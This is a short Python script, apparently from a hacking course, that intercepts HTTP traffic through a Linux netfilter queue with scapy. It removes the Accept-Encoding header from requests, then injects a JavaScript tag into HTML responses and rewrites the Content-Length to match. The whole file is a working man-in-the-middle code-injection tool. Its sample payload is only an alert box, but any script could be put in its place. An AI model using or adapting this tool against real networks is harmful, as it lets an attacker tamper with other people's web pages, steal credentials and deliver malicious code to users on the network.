import netfilterqueue
import scapy.all as scapy
import re


def set_load(scapy_packet, load):
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum
    return scapy_packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    try:
        if scapy_packet.haslayer(scapy.Raw):
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:  # HTTP Request
                print("[+] Request")
                load = re.sub("Accept-Encoding: .*?\\r\\n", "", load)

            elif scapy_packet[scapy.TCP].sport == 80:  # HTTP Response
                print("[+] Response")
                injection_code = "<script>alert('cemg!');</script>>"
                load = load.replace("<body>", injection_code + "<body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
    except UnicodeDecodeError:
        pass
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # callback function executed everytime we sniff a packet
queue.run()
